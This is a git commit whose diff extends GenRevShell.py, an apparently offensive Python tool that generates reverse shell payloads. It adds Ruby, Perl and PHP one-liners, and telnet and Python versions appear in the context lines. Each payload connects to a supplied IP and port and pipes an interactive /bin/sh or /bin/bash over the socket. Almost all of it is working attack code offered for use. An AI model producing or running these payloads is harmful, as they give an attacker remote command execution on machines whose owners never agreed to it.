bf72e51c5eff9a4f87a21ad2654f82f3d947b0d2
OusCyb3rH4ck <158448818+OusCyb3rH4ck@users.noreply.github.com>
2024-05-27 08:29:29 +0200

    Add files via upload

--- GenRevShell.py
+++ GenRevShell.py
@@ -15,12 +15,18 @@ def generate_payload(language, ip, port):
         return f'TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF'
     elif language == "python":
         return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
+    elif language == "ruby":
+        return f'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
+    elif language == "perl":
+        return f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
+    elif language == "php":
+        return f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
     else:
         return "Language not supported"
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Generate reverse shell payloads.")
-    parser.add_argument("language", choices=["bash", "nc1", "nc2", "powershell", "telnet", "python"], help="The language of the payload.")
+    parser.add_argument("language", choices=["bash", "nc1", "nc2", "powershell", "telnet", "python", "ruby", "perl", "php"], help="The language of the payload.")
     parser.add_argument("ip", help="The IP address to connect back to.")
     parser.add_argument("port", type=int, help="The port to connect back to.")
     args = parser.parse_args()
